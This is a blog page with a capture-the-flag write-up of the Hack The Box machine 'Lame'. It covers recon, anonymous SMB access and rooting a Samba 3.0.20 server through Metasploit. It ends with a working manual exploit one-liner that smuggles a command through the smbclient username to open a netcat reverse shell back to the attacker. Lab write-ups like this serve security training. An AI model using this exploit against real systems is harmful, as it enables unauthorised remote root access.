<html>
<head>
	<title>HTB: Lame</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="/CSS/blog.css">
	<link rel="stylesheet" href="/CSS/global.css">
</head>
<body class="noselect">
	<h1 id="title" class="blog_title">
		<a href="/index.html" class="homelink">
			HTB: Lame
		</a>
	</h1>
	<div id="big_wrapper" class="wordwrap">
		<div class="paragraph">
			<span id="menu_button" class="menu_item">...</span>
			<div id="menu">
				<a href="/index.html" class="menu_item">Home</a>
				<a href="/Blogs/TLDR/htb_lame.html" class="menu_item">TLDR</a>
				<a href="/Blogs/index.html" class="menu_item">All Blogs</a>
				<a href="/Blogs/resources.html" class="menu_item">Resources</a>
			</div>
			<hr>
		</div>

<div class="paragraph">
	<p class="subtitle">Intro:</p>
<p class="content"> Man, this box really does live up to it's name... This box was the be-all-end-all of beginner boxes. A nice chill box to do while you're on your beach vacation. It was quite literally half the challenge as you'll see in a bit.</p>
</div>
<div class="paragraph">
	<p class="subtitle">Recon:</p>
<p class="content">Pulling the classic <span class="code">nmap -sT -sV -A -v &lt;ip&gt;</span> gives us a couple ports: 21, 22, 139, and 445. First off, no web :( That's alright because our nmap scan shows us an ftp, ssh, and a samba server!</p>
<div class="image"><img src="./Pics/nmap_p21.png"><p class="imgsub">A somewhat provocative nmap scan result; Showing anonymous logins</p></div>
</div>
<div class="paragraph">
	<p class="subtitle">Finds 'n Fails:</p>
<p class="content">Firstly we grab that low-hanging fruit named "vsftpd", which permits anonymous logins. Poking around yields nothing but an empty directory. We can check the version number in Exploit DB, which yields a backdoor exploit. The exploit opens a shell on TCP port 6200 when a user logging in with a specific username. <a href="#ref_1" class="link">[1]</a><a href="#ref_2" class="link">[2]</a>. The references I've found are somewhat contradictory as one site says the username must start with a ':)', but another exploit ends the username with ':)'. Either way, trying to exploit the server is futile because the attack just hangs the commands.</p>
<p class="content">Moving on to the smb servers, we find they too allow anonymous logins: <span class="code">smbclient -L &lt;ip&gt;; [Enter]</span>. Man, these admins just really aren't trying, eh? Listing all the shares on the server shows us an interesting one, "/tmp", boasting the comment: "on noes!".</p>
<div class="image imgzoom"><img src="./Pics/smbclient-l.png"><p class="imgsub">Listing the shares via smbclient</p></div>
<p class="content">Checking out the /tmp share, there's nothing of interest here. We <b>ARE</b> able to upload a file, in this case a bash reverse shell, but we hit another dead end with no way of executing the file.</p>
</div>
<div class="paragraph">
	<p class="subtitle">Getting Use- er... Root?:</p>
<p class="content">Checking the listed shares again shows us the OS version. This info is also present in the nmap scan, but let's not get too crazy here. We're dealing with a "Samba 3.0.20-Debian" server. Once again, checking Exploit DB yields us an RCE via Metasploit <a href="#ref_3" class="link">[3]</a>. Running Metasploit finally lands us a shell: <span class="code_block"><br>msfconsole<br>
use exploit/multi/samba/usermap_script<br>
&lt;set relevant options&gt;<br>
exploit</span><br>Running "whoami" reveals that we have in fact gotten a root shell right off the bat! Listing /home shows us the "makis" directory, who's in posession of the user flag. Next we move over to /root to grab the root flag. Easy peasy!</p>
</div>
<div class="paragraph">
	<p class="subtitle">Anit-MSF:</p>
<p class="content">Sometimes Metasploit is very nice! Personally, it makes me feel ultra script kiddie. Don't even get me started on meterpreter! Just give me a shell and let me hack! We can remove MSF from the equation by reading the exploit's ruby file. Right down at the bottom, we can see that all the exploit does is pass a specific string as username, which allows us to execute code. Using this knowledge (and a bit of an explanation <b>POST SOLVE</b> from an article I can no longer find) we can craft our own exploit: <span class="code">sleep 1 && smbclient -L &lt;target ip&gt; -U '/`nohup nc &lt;local ip&gt; 3184 -e $(base64 -d &lt;&lt;&lt; "L2Jpbi9iYXNoCg==")`' &lt;&lt;&lt; "" & nc -lvp 3184</span> <a href="#ref_4" class="link">[4]</a>. This command passes a command substitution string as the username (the backticks), with "nohup" telling the machine to ignore logout signals which would end the process. We then run a netcat reverse shell. We find that we can't simply tell netcat to execute /bin/bash because it causes all the characters before "/bash" to become uppercase. To remediate this, we tell netcat to execute a string which will be decoded from base64, the string being "/bin/bash". Just like that we now have a manual exploit!</p>
</div>
<br><br><br><div class="paragraph res_list">
	<p class="subtitle">Resources:</p>
<p class="content"><a id="ref_1" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523" class="menu_item" target="_blank">MITRE CVE-2011-2523</a>&nbsp<b>[EXTERNAL]</b></p><br>
<p class="content"><a id="ref_2" href="https://vigilance.fr/vulnerability/vsftpd-backdoor-in-version-2-3-4-10805" class="menu_item" target="_blank">Vigilance explanation of CVE-2011-2523</a>&nbsp<b>[EXTERNAL]</b></p><br>
<p class="content"><a id="ref_3" href="https://www.exploit-db.com/exploits/16320" class="menu_item" target="_blank">Metasploit Exploit vsftpd 2.3.4</a>&nbsp<b>[EXTERNAL]</b></p><br>
<p class="content"><a id="ref_4" href="/Files/htb_lame_exploit.sh" class="menu_item">Samba exploit</a></p><br>
</div>
		<br>
		<div class="paragraph">
			<hr>
			<p class="content">Last edit: 2021.08.24</p>
		</div>
	</div>
</body>
<footer>
	<script type="text/javascript" src="/JS/blog.js"></script>
	<script type="text/javascript" src="/JS/cookies.js"></script>
</footer>
</html>
